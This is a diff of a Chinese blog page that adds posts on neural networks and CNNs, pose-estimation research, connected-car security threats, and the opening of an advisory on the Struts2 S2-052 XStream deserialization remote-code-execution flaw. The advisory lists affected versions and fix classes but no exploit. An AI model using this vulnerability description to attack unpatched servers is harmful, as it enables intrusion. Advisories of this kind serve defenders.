-<p>若输入层有 mm 个节点，隐层有 nn 个节点，那么 Θ=[θT]Θ=[θT] 为 n×mn×m 的矩阵，xx 为长为 mm 的向量，bb 为长为 nn 的向量，激活函数作用在向量的每个分量上， f(x)f(x) 返回一个向量。</p>
-<p><strong>隐层-输出层</strong></p>
-<p>可以视为级联在隐层上的一个感知器。若为二分类，则常用LogisticRegression；若为多分类，则常用Softmax Regression。</p>
-<p>卷积、下采样、光栅化、多层感知器预测</p>
-<p>卷积</p>
-<p>离散卷积运算。假设有二维离散函数 f(x,y),g(x,y) ， 那么它们的卷积定义为</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image016.gif" alt="clipboard.png"></p>
-<p>从这里，可以看到卷积的重要的物理意义是：一个函数（如：单位响应）在另一个函数（如：输入信号）上的<strong>加权叠加。</strong></p>
-<p>下采样</p>
-<p>下采样，即池化，目的是减小特征图，池化规模一般为2×2。常用的池化方法有：</p>
-<p>l 最大池化（Max Pooling）。取4个点的最大值。这是最常用的池化方法。</p>
-<p>l 均值池化（Mean Pooling）。取4个点的均值。</p>
-<p>l 高斯池化。借鉴高斯模糊的方法。不常用。具体过程不是很清楚。。。</p>
-<p>l 可训练池化。训练函数 f ，接受4个点为输入，出入1个点。不常用。</p>
-<p>光栅化</p>
-<p>图像经过池化-下采样后，得到的是一系列的特征图，而多层感知器接受的输入是一个向量。因此需要将这些特征图中的像素依次取出，排列成一个向量。具体说，对特征图 X1,X2,…,Xj ，光栅化后得到的向量</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image018.gif" alt="clipboard.png"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
     <article id="post-服务器配置"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
@@ -877,6 +408,180 @@
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/运维/">运维</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-人工神经网络"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/10/05/人工神经网络/">人工神经网络</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/10/05/人工神经网络/" class="article-date">
+	  <time datetime="2017-10-05T15:53:56.000Z" itemprop="datePublished">2017-10-05</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="人工神经网络"><a href="#人工神经网络" class="headerlink" title="人工神经网络"></a>人工神经网络</h2><p><strong>人工神经网络最重要的是 :   分类</strong></p>
+<p>神经网络分类： </p>
+<ol>
+<li><p>ANN（人工神经网络）</p>
+</li>
+<li><p>LSTM （循环神经网络）  时间共享</p>
+</li>
+<li><p>CNN（卷积神经网络）空间共享</p>
+<p>基本流程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分类样本--》训练样本--》建模--》测试样本--》结果</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>参考：<a href="https://www.zhihu.com/question/22553761" target="_blank" rel="noopener">https://www.zhihu.com/question/22553761</a></p>
+<h4 id="空间切一刀-某种激活函数-0-1阶跃、sigmoid、-sigmoid-（或者-tanh-）-但是可以一层一层级联"><a href="#空间切一刀-某种激活函数-0-1阶跃、sigmoid、-sigmoid-（或者-tanh-）-但是可以一层一层级联" class="headerlink" title="空间切一刀  +   某种激活函数(0-1阶跃、sigmoid、, sigmoid （或者 tanh ）),  但是可以一层一层级联"></a>空间切一刀  +   某种激活函数(0-1阶跃、sigmoid、, <em>sigmoid</em> （或者 <em>tanh</em> ）),  但是可以一层一层级联</h4><p>​      这一层是下一层的输入。       </p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image002.gif" alt="clipboard.png"></p>
+<p>​    类似于人类大脑的神经元之间能够不断的调节连接强度从而达到不断的训练与学习的目的，人工神经网络同样可以做到不断的调整输入连接上的权值使得该神经网络能够更加的适应训练集合。</p>
+<p>​    在人工神经网络方法学习训练的过程当中，学习样本的特征向量被传递进输入端作为输入的数据，分类结果作为学习样本的输出，也是整个网络的输出；然后，人工神经网络将会根据上一步的样本输出调节输入的权值 w，使得训练之后的误差逐步减小。通过不断的训练与调整的过程，使得训练样本的实际输出越来越接近于真实目标。</p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image004.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image006.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image008.gif" alt="clipboard.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">其中函数 f（）称为非线性激活函数，激活函数根据实际应用确定，调整权值。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">反向传播算法  ：  结果反向决定输入，不断调整权值，</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">常用激活  函数  ：  logistic   Sigmoid    sign , tanh</span><br></pre></td></tr></table></figure>
+<h4 id="感知机："><a href="#感知机：" class="headerlink" title="感知机："></a>感知机：</h4><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image010.gif" alt="clipboard.png"></p>
+<p>其中激活函数 <em>act</em> 可以使用{<em>sign, sigmoid, tanh</em>}之一。</p>
+<p>l 激活函数使用符号函数 <em>sign</em> ，可求解损失函数最小化问题，通过梯度下降确定参数</p>
+<p>l 激活函数使用 <em>sigmoid</em> （或者 <em>tanh</em> ），则分类器事实上成为Logistic Regression，可通过梯度上升极大化似然函数，或者梯度下降极小化损失函数，来确定参数</p>
+<p>l 如果需要多分类，则事实上成为SoftmaxRegression</p>
+<p>l 如要需要分离超平面恰好位于正例和负例的正中央，则成为支持向量机（SVM）。</p>
+<h4 id="多层感知器"><a href="#多层感知器" class="headerlink" title="多层感知器"></a>多层感知器</h4><p>感知器存在的问题是，对线性可分数据工作良好，如果设定迭代次数上限，则也能一定程度上处理近似线性可分数据。但是对于非线性可分的数据，比如最简单的异或问题，感知器就无能为力了。这时候就需要引入多层感知器这个大杀器。</p>
+<p>多层感知器的思路是，尽管原始数据是非线性可分的，但是可以通过某种方法将其映射到一个线性可分的高维空间中，从而使用线性分类器完成分类。图1中，从X到O这几层，正展示了多层感知器的一个典型结构，即输入层-隐层-输出层。</p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image012.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image014.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image016.gif" alt="clipboard.png"></p>
+<h3 id="logistic-函数"><a href="#logistic-函数" class="headerlink" title="logistic   函数"></a>logistic   函数</h3><h5 id="非对称："><a href="#非对称：" class="headerlink" title="非对称："></a>非对称：</h5><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image018.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image020.gif" alt="clipboard.png"></p>
+<h5 id="对称："><a href="#对称：" class="headerlink" title="对称："></a>对称：</h5><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image022.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image024.gif" alt="clipboard.png"></p>
+<h3 id="反馈神经网络-BP神经网络"><a href="#反馈神经网络-BP神经网络" class="headerlink" title="反馈神经网络  BP神经网络"></a>反馈神经网络  BP神经网络</h3><p>Hebb改变权重上个神经元进行调整 。学习是一类相关学习，算法的基本思想是：如果有两个神经元同时兴奋，则它们之间的连接强度的增强与它们的激励的乘积成正比</p>
+<p>在Hebb学习规则中，学习信号简单地等于神经元的输出：</p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image026.gif" alt="clipboard.png"></p>
+<p>用yi(k)表示单元i 在k 时刻的激活值（输出），yj (k)表示单元j在 k 时刻的激活值，wij(k)表示单元i到单元j的连接权值，则Hebb学习规则可表示如下：</p>
+<p>∆Wij(k)=Wij(k+1)-Wij(k)=η<em>yi(k)</em>yj(k+1),式中η为学习速率</p>
+<p><strong>权值调整量与输入输出的乘积成正比。</strong></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image028.gif" alt="clipboard.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-Covolutions Neural Netwrk"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/10/02/Covolutions Neural Netwrk/">Covolutions Neural Netwrk</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/10/02/Covolutions Neural Netwrk/" class="article-date">
+	  <time datetime="2017-10-02T15:53:56.000Z" itemprop="datePublished">2017-10-02</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Covolutions-Neural-Netwrk"><a href="#Covolutions-Neural-Netwrk" class="headerlink" title="Covolutions Neural Netwrk"></a>Covolutions Neural Netwrk</h3><p>​    卷积神经网络有三种层：卷积层、池化层和全连接层（Convolutional Layer, Pooling Layer, 及Fully-Connected Layer）。 </p>
+<p>[INPUT - CONV - RELU - POOL - FC]            也就是  [输入-卷积-激活-池化-分类得分</p>
+<p>卷积神经网络是计算机自主学习的一种方式。（自学习） 卷积神经网络（CNN）</p>
+<p>由Huabel与Wiesel在研究猫的脑皮层中用局部敏感和方法选择的神经元时发现其独特的网络结构可以有效的降低反馈神经网络的复杂性提出。</p>
+<p>DCNN（Deep ConvolutionalNeural Network，深度卷积网络）与LSTM（LongShort Term Memory，长短时记忆网络）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据-》自学习-》结果</span><br><span class="line"></span><br><span class="line">输入-》 算法 -》输出</span><br></pre></td></tr></table></figure>
+<p><strong>空间共享</strong></p>
+<p>​    计算机视觉里经常使卷积神经网络，即CNN，是一种对人脑比较精准的模拟。</p>
+<p>​    什么是卷积？卷积就是两个函数之间的相互关系，然后得出一个新的值，他是在连续空间做积分计算，然后在离散空间内求和的过程。实际上在计算机视觉里面，可以把卷积当做一个抽象的过程，就是把小区域内的信息统计抽象出来。</p>
+<p>​    比如，对于一张爱因斯坦的照片，我可以学习n个不同的卷积和函数，然后对这个区域进行统计。可以用不同的方法统计，比如着重统计中央，也可以着重统计周围，这就导致统计的和函数的种类多种多样，为了达到可以同时学习多个统计的累积和。</p>
+<p>从LeNet到AlexNet</p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="32919ad4d34.jpeg"></p>
+<p>物体检测问题</p>
+<p>Region CNN YOLO</p>
+<p>FACEBOOK提出来的YOLO网络，物体检测，</p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image004.gif" alt="clipboard.png"></p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image006.gif" alt="clipboard.png"></p>
+<p>权重 W 与偏移量B  相同     不同的是输入的值</p>
+<p>ConvNet体系结构：<strong>卷积层</strong>，<strong>池层</strong>和<strong>完全连接层</strong>（正如在常规神经网络中所见）</p>
+<h3 id="ConvNet"><a href="#ConvNet" class="headerlink" title="ConvNet"></a><strong>ConvNet</strong></h3><p>C++中卷积神经网络的GPU实现</p>
+<p>一个示例ConvNet架构的激活。初始卷存储原始图像像素（左），最后一个卷存储类分数（右）。沿着处理路径的每个激活量显示为一列。由于难以将3D体积可视化，因此我们将行卷切成行。最后一层卷保留每个类的分数，但在这里我们只可视化排序的前5个分数，并打印每个分数的标签。完整<a href="http://cs231n.stanford.edu/" target="_blank" rel="noopener">的基于Web的演示文稿</a>显示在我们网站的标题中。这里所示的架构是一个小型的VGG网络，稍后将讨论。</p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image008.gif" alt="clipboard.png"></p>
+<p>双曲正切函数是双曲函数中的一个函数。</p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image010.gif" alt="clipboard.png"></p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image012.gif" alt="clipboard.png"></p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image014.gif" alt="clipboard.png"></p>
+<p><strong>输入图像I。</strong>为了减小复杂度，一般使用灰度图像。当然，也可以使用RGB彩色图像，此时输入图像有三张，分别为RGB分量。输入图像一般需要归一化，1、如果使用sigmoid激活函数，则归一化到[0,1]        2、 如果使用tanh激活函数，则归一化到[-1, 1]。</p>
+<p><strong>多个卷积（C）-下采样（S）层</strong>。将上一层的输出与本层权重W做卷积得到各个C层，然后下采样得到各个S层。怎么做以及为什么，下面会具体分析。这些层的输出称为FeatureMap。</p>
+<p><strong>光栅化（X）</strong>。是为了与传统的多层感知器全连接。即将上一层的所有Feature Map的每个像素依次展开，排成一列。</p>
+<p><strong>传统的多层感知器（N&amp;O）</strong>。最后的分类器一般使用Softmax，如果是二分类，当然也可以使用LR。</p>
+<h4 id="输入层-隐层："><a href="#输入层-隐层：" class="headerlink" title="输入层-隐层："></a><strong>输入层-隐层：</strong></h4><p>是一个全连接的网络，即每个输入节点都连接到所有的隐层节点上。更详细地说，可以把输入层视为一个向量 xx ，而隐层节点 jj 有一个权值向量 θjθj 以及偏置 bjbj ，激活函数使用 <em>sigmoid</em> 或 <em>tanh</em> ，那么这个隐层节点的输出应该是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fj(x)=act(θTjx+bj)fj(x)=act(θjTx+bj)</span><br></pre></td></tr></table></figure>
+<p>也就是每个隐层节点都相当于一个感知器。每个隐层节点产生一个输出，那么隐层所有节点的输出就成为一个向量，即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(x)=act(Θx+b)f(x)=act(Θx+b)</span><br></pre></td></tr></table></figure>
+<p>若输入层有 mm 个节点，隐层有 nn 个节点，那么 Θ=[θT]Θ=[θT] 为 n×mn×m 的矩阵，xx 为长为 mm 的向量，bb 为长为 nn 的向量，激活函数作用在向量的每个分量上， f(x)f(x) 返回一个向量。</p>
+<h4 id="隐层-输出层"><a href="#隐层-输出层" class="headerlink" title="隐层-输出层:"></a><strong>隐层-输出层</strong>:</h4><p>可以视为级联在隐层上的一个感知器。若为二分类，则常用LogisticRegression；若为多分类，则常用Softmax Regression。</p>
+<p><strong>卷积、下采样、光栅化、多层感知器预测</strong></p>
+<h5 id="卷积"><a href="#卷积" class="headerlink" title="卷积"></a>卷积</h5><p>离散卷积运算。假设有二维离散函数 f(x,y),g(x,y) ， 那么它们的卷积定义为</p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image016.gif" alt="clipboard.png"></p>
+<p>从这里，可以看到卷积的重要的物理意义是：一个函数（如：单位响应）在另一个函数（如：输入信号）上的<strong>加权叠加。</strong></p>
+<h5 id="下采样"><a href="#下采样" class="headerlink" title="下采样"></a>下采样</h5><p>下采样，即池化，目的是减小特征图，池化规模一般为2×2。常用的池化方法有：</p>
+<p>最大池化（Max Pooling）。取4个点的最大值。这是最常用的池化方法。</p>
+<p>均值池化（Mean Pooling）。取4个点的均值。</p>
+<p>高斯池化。借鉴高斯模糊的方法。不常用。具体过程不是很清楚。。。</p>
+<p>可训练池化。训练函数 f ，接受4个点为输入，出入1个点。不常用。</p>
+<h5 id="光栅化"><a href="#光栅化" class="headerlink" title="光栅化"></a>光栅化</h5><p>图像经过池化-下采样后，得到的是一系列的特征图，而多层感知器接受的输入是一个向量。因此需要将这些特征图中的像素依次取出，排列成一个向量。具体说，对特征图 X1,X2,…,Xj ，光栅化后得到的向量</p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image018.gif" alt="clipboard.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
 
     </footer>
   </div>
@@ -1096,6 +801,395 @@
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-姿势估计背景历史"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/09/15/姿势估计背景历史/">状态估计背景历史</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/09/15/姿势估计背景历史/" class="article-date">
+	  <time datetime="2017-09-15T15:53:56.000Z" itemprop="datePublished">2017-09-15</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>2015 年之前的方法都是回归出精确的关节点坐标( x,y )，采用这种方法不好的原因是人体运动灵活，模型可扩展性较差。</p>
+<p>多人姿态估计的两种研究方法：</p>
+<ul>
+<li>自顶向下(top-down)：先检测出多个人,再对每一个人进行姿态估计，可以将detection的方法加上单人姿态估计来实现；</li>
+</ul>
+<ul>
+<li>自底向上(bottom-up)：先检测出关节点,再判断每一个关节点属于哪一个人。</li>
+</ul>
+<p>基于cnn的多人姿态估计方法</p>
+<p>多人估计方法一般分为两大类，即自顶向下和自底向上，</p>
+<p>其中自顶向下是指先把人框出来，然后再用单人的方法去定位人的关节，</p>
+<p>而自底向上的方法是先把所有关节位置弄出来，然后再区分关节属于谁。</p>
+<p>二维图像姿态估计基于cnn的单人姿态估计方法</p>
+<p>2014 deeppose                 直接回归关节的坐标        ：  深度姿势直接回归关节的坐标</p>
+<p>2015 flowconvnet               回归heatmap，间接得到坐标      ：使用卷积神经网络回归热图，间接得到坐标。      </p>
+<p>2016 很多方法了 CPM，hourglass， 以及一票改结构的方法</p>
+<p>2017 依旧改结构，感觉很无趣，xiaogang组的wei wang和xiaochu基于hourglass改的一个网络目前是第一，91.5%</p>
+<p>2016 mpii的deep cut和deeper cut</p>
+<p>2017 partaffine field方法，cmu的，效果很赞。openpose。</p>
+<p>一、   多人 ：  2D Pose estimation：</p>
+<p>\1. open-Pose：<strong><realtime multi-person2d="" pose="" estimation="" using="" part="" affinity="" fields=""></realtime></strong>（CVPR 2017 Oral, CMU）</p>
+<p>性能：COCO: 61%MPII:75%   自下而上的方法</p>
+<p>\2. G-RMI <strong><towards accurate="" multi-person="" poseestimation="" in="" the="" wild=""></towards></strong> (CVPR 2017 Google)    </p>
+<p>性能：COCO: 67%</p>
+<p>3.Associative Embedding <strong>&lt;AssociativeEmbedding:End-to-End Learning for Joint Detection and Grouping&gt;</strong>(rejected by ICCV2017 , UMICH Jia Deng)</p>
+<p>性能： COCO:66% MPII: 77%</p>
+<p>\4. <strong><joint multi-person="" pose="" estimation="" andsemantic="" part="" segmentation=""></joint></strong> ( ICCV 2017, UCLA)    自下而上的方法</p>
+<p>性能：PASCAL-Person-Part:62.8%</p>
+<p>\5. <strong><mask rcnn=""></mask></strong> (ICCV 2017, Facebook，Kaiming He） RCNN</p>
+<p>性能：COCO: 63%</p>
+<p>\6. &lt;<strong>RMPE: Regional Multi-Person Pose Estimation</strong>&gt;(ICCV 2017 , SJTU ,Tencent Youtu)   </p>
+<p>性能：COCO :61.8% MPII: 76%</p>
+<p>\1. open-Pose：&lt;使用部分亲和场的实时多人2D姿态估计&gt;（CVPR 2017 Oral，CMU）</p>
+<p>性能：COCO：61％MPII：75％</p>
+<p>\2. G-RMI&lt;朝向准确的多人姿势估计&gt;（CVPR 2017 Google）</p>
+<p>性能：COCO：67％</p>
+<p>3.关联嵌入&lt;关联嵌入：联合检测和分组的端到端学习&gt;（由ICCV2017，UMICHJia Deng拒绝）</p>
+<p>性能：COCO：66％MPII：77％</p>
+<p>\4. &lt;联合多人姿态估计和语义部分分割&gt;（ICCV 2017，UCLA）</p>
+<p>性能：PASCAL-Person-Part：62.8％</p>
+<p>\5. <maskrcnn>（ICCV 2017，Facebook，开明和）RCNN    </maskrcnn></p>
+<p>性能：COCO：63％</p>
+<p>\6. &lt;RMPE：区域多人姿态估计&gt;（ICCV 2017，上海交通大学，腾讯优图）</p>
+<p>性能：COCO：61.8％MPII：76％</p>
+<p>二、3D Poseand Shape estimation</p>
+<p>\7. SMPLify:3D Human Pose and Shape from a Single Image (ECCV 2016)</p>
+<p>\8. A simplebaseline for 3d human pose estimation in tensorflow. To be presented at ICCV17.</p>
+<p>\9. <strong>Coarse-to-Fine Volumetric Prediction forSingle-Image 3D Human Pose (CVPR),2017</strong></p>
+<p>其中：</p>
+<p><strong>1. Bottom-up approach</strong>      自下而上的方法：     先检测joints（关节）和 limbs（四肢），然后将他们group  （组）成一个人。             代表文章<1><4> 。</4></1></p>
+<p>优点：整个图像只需要处理一遍，速度不随人数增加而变化；</p>
+<p><strong>2. Top-Down approach</strong>     自上而下的方法：     先检测单个人，再针对单个人做single-person poseestimation。 代表文章</p>
+<p>先检测单个人，逐步对于每个进行 检测</p>
+<p>优点：思路直观，自然，被绝大部分人所青睐，且单人估计精度非常高。</p>
+<p>相关数据集/ 竞赛</p>
+<ol>
+<li><strong>MSCOCOKeypoint</strong></li>
+</ol>
+<p><a href="http://cocodataset.org/" target="_blank" rel="noopener">http://cocodataset.org/</a></p>
+<ol start="2">
+<li><strong>MPII</strong></li>
+</ol>
+<p><a href="http://human-pose.mpi-inf.mpg.de/#results" target="_blank" rel="noopener">http://human-pose.mpi-inf.mpg.de/#results</a></p>
+<ol start="3">
+<li><strong>Posetrack</strong></li>
+</ol>
+<p><a href="https://posetrack.net/" target="_blank" rel="noopener">https://posetrack.net/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-车联网安全基础"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/09/09/车联网安全基础/">车联网安全</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/09/09/车联网安全基础/" class="article-date">
+	  <time datetime="2017-09-09T15:53:56.000Z" itemprop="datePublished">2017-09-09</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="车联网安全基础"><a href="#车联网安全基础" class="headerlink" title="车联网安全基础"></a>车联网安全基础</h1><p><a href="http://shackles.top/2017/08/02/%E8%BD%A6%E8%81%94%E7%BD%91/"> 2017-08-02</a></p>
+<h3 id="车联网"><a href="#车联网" class="headerlink" title="车联网"></a>车联网</h3><h5 id="汽车现状：智能化-，网联化，电动化"><a href="#汽车现状：智能化-，网联化，电动化" class="headerlink" title="汽车现状：智能化 ，网联化，电动化"></a>汽车现状：智能化 ，网联化，电动化</h5><ol>
+<li><p>车载系统</p>
+</li>
+<li><p>​</p>
+</li>
+<li><p>安全现状 ：</p>
+</li>
+<li><p>车联网安全解决方案</p>
+<ol>
+<li>终端<ol>
+<li>设计</li>
+<li>ids</li>
+</ol>
+</li>
+<li>网络<ol>
+<li>车内部可信机制</li>
+<li>车与智能手机</li>
+<li>车网络服务</li>
+</ol>
+</li>
+<li>云服务</li>
+</ol>
+</li>
+<li><p>标准规范</p>
+<h3 id="车载网络"><a href="#车载网络" class="headerlink" title="车载网络"></a>车载网络</h3></li>
+<li><p>CSMA/CD 带冲突检测控制</p>
+</li>
+<li><p>CAN总线</p>
+<ol>
+<li>主要测传输机制csma/cd</li>
+<li>CAN是控制器局域网络(Controller Area Network, CAN)的简称</li>
+<li>一种通讯协议（类似TCP IP协议）</li>
+<li>​</li>
+</ol>
+</li>
+<li><p>车载网络 C类网络</p>
+</li>
+</ol>
+<ol>
+<li>录制重放</li>
+<li>隔离重放</li>
+<li>实时</li>
+<li>man-in-the-middle</li>
+</ol>
+<p>###</p>
+<p>手机卡</p>
+<p>HMI 与车内 网络<br>软件操作系统的安全性、通讯安全、对于安全持续度量。</p>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>自动驾驶安全性问题</p>
+<ol>
+<li>方程式 Al</li>
+<li>内部攻击</li>
+<li><ol>
+<li>传感信号伪造​</li>
+</ol>
+</li>
+<li>自动驾驶以及车联网的整体安全架构<ol>
+<li>系统安全的设计</li>
+<li>车通讯</li>
+<li>车就是个内网<br>重放 篡改</li>
+</ol>
+</li>
+<li>网络与系统<br>防御与攻击</li>
+<li>app加固</li>
+<li>车联网安全 T-BOX（网络） CAN总线（控制汽车）</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/物联网安全/">物联网安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-Struts2 远程代码执行漏洞S2-052"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/09/06/Struts2 远程代码执行漏洞S2-052/">Struts2 远程代码执行漏洞S2-052</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/09/06/Struts2 远程代码执行漏洞S2-052/" class="article-date">
+	  <time datetime="2017-09-06T15:53:56.000Z" itemprop="datePublished">2017-09-06</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Struts2-远程代码执行漏洞S2-052"><a href="#Struts2-远程代码执行漏洞S2-052" class="headerlink" title="Struts2 远程代码执行漏洞S2-052"></a>Struts2 远程代码执行漏洞S2-052</h1><p><a href="http://shackles.top/2017/09/06/S2-052/"> 2017-09-06</a></p>
+<h2 id="Struts2-远程代码执行漏洞-S2-052"><a href="#Struts2-远程代码执行漏洞-S2-052" class="headerlink" title="Struts2 远程代码执行漏洞 : S2-052"></a>Struts2 远程代码执行漏洞 : S2-052</h2><p>Struts2 应用又曝出存在新的高危远程代码执行漏洞。该漏洞由lgtm.com的安全研究员汇报，编号为 CVE-2017-9805 ，漏洞危害程度为高危（Critical）。当用户使用带有 XStream 程序的 Struts REST 插件来处理 XML payloads 时，可能会遭到远程代码执行攻击。</p>
+<ul>
+<li>前提：启用Strut REST 插件。</li>
+<li>Struts 2.5 – Struts 2.5.12 版本</li>
+<li>官方公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-052</a></li>
+<li>漏洞编号：S2-052</li>
+<li>CVE-2017-9805</li>
+</ul>
+<h3 id="S2-052概述"><a href="#S2-052概述" class="headerlink" title="S2-052概述"></a>S2-052概述</h3><p>Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。</p>
+<p>漏洞是由 Semmle 使用其开源分析工具 lgtm 及 QL 语言编写的 Java 反序列威胁查询检测而出的，详情可参考<br><a href="https://lgtm.com/blog/apache_struts_CVE-2017-9805" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2017-9805</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.struts2.rest.handler.AllowedClasses</span><br><span class="line"></span><br><span class="line">org.apache.struts2.rest.handler.AllowedClassNames</span><br><span class="line"></span><br><span class="line">org.apache.struts2.rest.handler.XStreamPermissionProvider</span><br></pre></td></tr></table></figure>
